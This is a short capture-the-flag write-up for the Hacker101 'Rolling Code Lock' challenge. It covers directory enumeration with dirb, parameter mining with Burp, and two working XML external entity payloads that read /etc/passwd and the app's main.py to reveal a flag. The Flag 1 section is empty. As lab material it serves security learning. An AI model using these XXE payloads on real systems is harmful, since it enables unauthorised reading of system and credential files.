# Model E1337 - Rolling Code Lock | Hacker 101

This challenge was quite fun and quite difficult.
Initially we are presented with a page with a single input.

#### Flag 0 - Found

I started by looking for some directories.

dirb <target>

showed that there was a /admin directory.

This path led to another simple page but the source code revealed something interesting.

<!-- We should be using get-config for this on the client side. -->

where there is a "get", there is usually a "set"

so I used the route set-config?=test and then used Burp Param Miner to mine my way through to find that "data" is the appropriate argument.

I then used XML Entity Injection to see if I could see anything from the responses.

```xml
<?xml version="1.0"?>
<!DOCTYPE xxe[<!ENTITY writer SYSTEM "/etc/passwd">]>
<config>
  <location>&writer;</location>
</config>
```

Hint: This application runs on the uwsgi-nginx-flask-docker image

so we know that there is probably a main.py file.

modify the xml to reflect this approach

```xml
<?xml version="1.0"?>
<!DOCTYPE xxe[<!ENTITY writer SYSTEM "main.py">]>
<config>
  <location>&writer;</location>
</config>
```

Keeping an eye on the source code we can see that there is our first flag.

---

#### Flag 1

---
